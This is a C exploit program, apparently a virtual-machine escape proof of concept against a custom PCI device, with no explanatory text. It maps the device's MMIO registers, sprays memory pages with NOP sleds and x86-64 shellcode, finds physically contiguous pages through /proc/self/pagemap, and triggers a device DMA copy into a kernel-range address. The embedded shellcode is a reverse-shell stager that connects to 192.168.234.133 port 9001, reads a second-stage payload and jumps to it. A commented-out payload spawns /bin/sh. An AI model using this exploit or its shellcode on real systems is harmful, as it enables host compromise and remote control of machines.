#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <assert.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/shm.h>
#include <malloc.h>
#include <time.h>

static char *resource_path[0x20] = {0};
static int fds[0x20] = {0};
static size_t mmios[0x20] = {0};
static uint64_t MAP_SIZEs[0x20] = {0};

typedef struct {
    uint64_t CP_src;
    uint64_t CP_cnt;
    uint64_t CP_dst;
} FastCP_CP_INFO;

#define PRINT_ERROR \
 do { \
  fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
  __LINE__, __FILE__, errno, strerror(errno));\
 } while(0);

int fd = -1;

unsigned long get_file_size(const char *path)
{
    unsigned long filesize = -1;
    struct stat statbuff;
    if(stat(path, &statbuff) < 0){
        return filesize;
    }else{
        filesize = statbuff.st_size;
    }
    return filesize;
}

void pcimem_read(uint64_t target, char access_type, uint64_t *read_result, size_t resid)
{
  if (mmios[resid] == 1) {
    /* Map one page */
    void *map_base = mmap(0, MAP_SIZEs[resid], PROT_READ | PROT_WRITE, MAP_SHARED, fds[resid], 0);
    if(map_base == (void *) -1) {
      printf("\n[*] mmap error %lx\n", target);
      return;
    }

    void *virt_addr = (char *)map_base + target;
    int type_width = 0;

    switch(access_type)
    {
      case 'b':
        *read_result = *((uint8_t *) virt_addr);
        type_width = 1;
        break;
      case 'w':
        *read_result = *((uint16_t *) virt_addr);
        type_width = 2;
        break;
      case 'd':
        *read_result = *((uint32_t *) virt_addr);
        type_width = 4;
        break;
      case 'q':
        *read_result = *((uint64_t *) virt_addr);
        type_width = 8;
        break;
    }

    if(munmap(map_base, MAP_SIZEs[resid]) == -1)
      return;
  }
  else {
    lseek(fds[resid], target, SEEK_SET);
    switch(access_type)
    {
      case 'b':
        read(fd, (uint8_t *)read_result, 1);
        break;
      case 'w':
        read(fd, (uint8_t *)read_result, 2);
        break;
      case 'd':
        read(fd, (uint8_t *)read_result, 4);
        break;
      case 'q':
        read(fd, (uint8_t *)read_result, 8);
        break;
    }
    lseek(fds[resid], 0, SEEK_SET);
  }
}

void pcimem_write(uint64_t target, char access_type, uint64_t writeval, size_t resid)
{
  if (mmios[resid] == 1) {
    /* Map one page */
    void *map_base = mmap(0, MAP_SIZEs[resid], PROT_READ | PROT_WRITE, MAP_SHARED, fds[resid], 0);
    if(map_base == (void *) -1) {
      printf("\n[*] mmap error %lx\n", target);
      return;
    }
    int type_width = 0;
    void *virt_addr = (char *)map_base + target;
    //printf("res[%lu] mmio addr[%016lx] --> val[%016lx] width[%c]\n", resid, target, writeval, access_type);
    switch(access_type)
    {
      case 'b':
        *((uint8_t *) virt_addr) = writeval;
        type_width = 1;
        break;
      case 'w':
        *((uint16_t *) virt_addr) = writeval;
        type_width = 2;
        break;
      case 'd':
        *((uint32_t *) virt_addr) = writeval;
        type_width = 4;
        break;
      case 'q':
        *((uint64_t *) virt_addr) = writeval;
        type_width = 8;
        break;
    }
    //readback not correct?
    if(munmap(map_base, MAP_SIZEs[resid]) == -1)
      return;
  }
  else {
    lseek(fds[resid], target, SEEK_SET);
    //printf("res[%lu] pmio addr[%016lx] --> val[%016lx] width[%c]\n", resid, target, writeval, access_type);
    switch(access_type)
    {
      case 'b':
        write(fd, (uint8_t *)(&writeval), 1);
        break;
      case 'w':
        write(fd, (uint8_t *)(&writeval), 2);
        break;
      case 'd':
        write(fd, (uint8_t *)(&writeval), 4);
        break;
      case 'q':
        write(fd, (uint8_t *)(&writeval), 8);
        break;
    }
    lseek(fds[resid], 0, SEEK_SET);
  }
}

uint64_t virt2phys(void* p)
{
  uint64_t virt = (uint64_t)p;

  // Assert page alignment
  assert((virt & 0xfff) == 0);

  int fd = open("/proc/self/pagemap", O_RDONLY);
  if (fd == -1)
   return -1;

  uint64_t offset = (virt / 0x1000) * 8;
  lseek(fd, offset, SEEK_SET);

  uint64_t phys;
  if (read(fd, &phys, 8 ) != 8)
   return -1;

  // Assert page present
  assert (phys & (1ULL << 63));

  phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
  return phys;
}

char *dev_get_path_from_id(unsigned int inc_id, unsigned int dev_id, unsigned int res_id) {
  FILE *fstream = NULL;
  char buff[1024];
  char hex_inc_id[0x10] = {0};
  char hex_dev_id[0x10] = {0};
  sprintf(hex_inc_id, "%04x", inc_id);
  sprintf(hex_dev_id, "%04x", dev_id);
  if (NULL == (fstream = popen("lspci -n", "r")))
  {
    fprintf(stderr, "execute command failed: %s\n", strerror(errno));
    return NULL;
  }
  while (1) {
    memset(buff, 0, sizeof(buff));
    if(NULL != fgets(buff, sizeof(buff), fstream))
    {
      if (strstr(buff, hex_inc_id) != NULL && strstr(buff, hex_dev_id) != NULL) {
        __uint16_t pci_id = 0;
        __uint16_t pci_addr0 = 0;
        __uint16_t pci_addr1 = 0;
        char *device_path = (char *)calloc(512, 1);
        sscanf(buff, "%hx:%hx.%hx ", &pci_id, &pci_addr0, &pci_addr1);
        sprintf(device_path, "/sys/devices/pci0000:%02hx/0000:%02hx:%02hx.%01hx/resource%d", pci_id, pci_id, pci_addr0, pci_addr1, res_id);
        puts(device_path);
        pclose(fstream);
        return device_path;
      }
    }
    else
    {
      break;
    }
  }
  pclose(fstream);
  return 0;
  return NULL;
}

//static uint8_t shellcode[] = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05";
static uint8_t shellcode[] = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x23\x29\xc0\xa8\xea\x85\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";



void do_write(size_t paddr, size_t offset, size_t size) {
  pcimem_write(0x08, 'q', offset, 0);
  pcimem_write(0x10, 'q', size, 0);
  pcimem_write(0x18, 'q', paddr, 0);
  pcimem_write(0x20, 'q', 0xf62d, 0);
}

int main() {
  srand(time(NULL));
  struct stat file_info;
  for (size_t idx = 0; idx < 0x20; idx ++) {
    resource_path[idx] = dev_get_path_from_id(0x4399, 0x4399, idx);
    fds[idx] = open(resource_path[idx], O_RDWR | O_SYNC);
    if (fds[idx] != -1) {
      int ret = stat(resource_path[idx], &file_info);
      MAP_SIZEs[idx] = file_info.st_size;
      void * map_try = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fds[idx], 0);
      if (map_try == (void *)-1) {
        printf("fd[%lu] --> pmio, size --> %016lx\n", idx, MAP_SIZEs[idx]);
        mmios[idx] = 0;
      }
      else {
        mmios[idx] = 1;
        printf("fd[%lu] --> mmio, size --> %016lx\n", idx, MAP_SIZEs[idx]);
        munmap(map_try, 0x1000);
      }
    }
  }

  void *info = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

  void *pages[100];

  for (size_t i = 0; i < 100; i ++) {
    pages[i] = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    memset(pages[i], '\x90', 0x1000);

    for(size_t j = 0x400; j < 0x1000; j += 0x300) {
      memcpy((char *)pages[i] + j, shellcode, sizeof(shellcode));
    }
    printf("%lx\n", virt2phys(pages[i]));
  }

  memset(info, '\x90', 0x1000);

  size_t start = 0xffff;
  for (size_t i = 0; i < 100 - 8; i ++) {
    size_t fail = 0;
    size_t phys[8];
    phys[0] = virt2phys(pages[i]);
    for (size_t j = 1; j < 8; j ++) {
      phys[j] = virt2phys(pages[i+j]);
      if (phys[j] - phys[j - 1] != 0x1000) {
        fail = 1;
        break;
      }
    }
    if (fail == 0) {
      start = i;
    }
  }

  printf("%lx\n", start);
  assert (start != 0xffff);

  do_write(virt2phys(pages[start]), 0xffffffffbcf00000, 0x8000);

  return 0;
}
